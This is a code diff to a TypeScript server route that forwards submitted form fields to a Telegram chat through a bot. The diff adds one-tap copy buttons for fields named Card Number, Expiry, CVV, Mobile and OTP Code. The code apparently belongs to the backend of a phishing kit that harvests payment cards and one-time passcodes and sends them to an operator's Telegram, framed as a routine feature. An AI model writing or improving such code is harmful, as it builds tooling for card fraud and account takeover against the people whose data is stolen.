@@ -10,6 +10,29 @@ function escapeHtml(value: string) {
     .replace(/>/g, '&gt;')
 }
 
+// Fields sensitive/short enough to be worth a one-tap "copy to clipboard"
+// button under the Telegram message (Bot API 7.5+ inline keyboard buttons).
+const COPYABLE_LABELS = ['Card Number', 'Expiry', 'CVV', 'Mobile', 'OTP Code']
+
+// Group buttons two-per-row, matching the reference layout (Card Number +
+// Expiry on one row, CVV + Mobile on the next, etc).
+function buildCopyKeyboard(fields: Field[]) {
+  const buttons = fields
+    .filter((f) => COPYABLE_LABELS.some((label) => label.toLowerCase() === f.label.toLowerCase()))
+    .map((f) => ({
+      text: `Copy ${f.label}`,
+      copy_text: { text: f.value },
+    }))
+
+  if (buttons.length === 0) return undefined
+
+  const rows: Array<Array<(typeof buttons)[number]>> = []
+  for (let i = 0; i < buttons.length; i += 2) {
+    rows.push(buttons.slice(i, i + 2))
+  }
+  return { inline_keyboard: rows }
+}
+
 export async function POST(request: Request) {
   try {
     const body = await request.json()
@@ -41,6 +64,7 @@ export async function POST(request: Request) {
       .map((f) => `<b>${escapeHtml(f.label)}:</b> ${escapeHtml(f.value)}`)
       .join('\n')
     const text = `<b>${escapeHtml(title)}</b>\n${lines}`
+    const reply_markup = buildCopyKeyboard(fields)
 
     const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
@@ -49,6 +73,7 @@ export async function POST(request: Request) {
         chat_id: chatId,
         text,
         parse_mode: 'HTML',
+        ...(reply_markup ? { reply_markup } : {}),
       }),
       cache: 'no-store',
     })
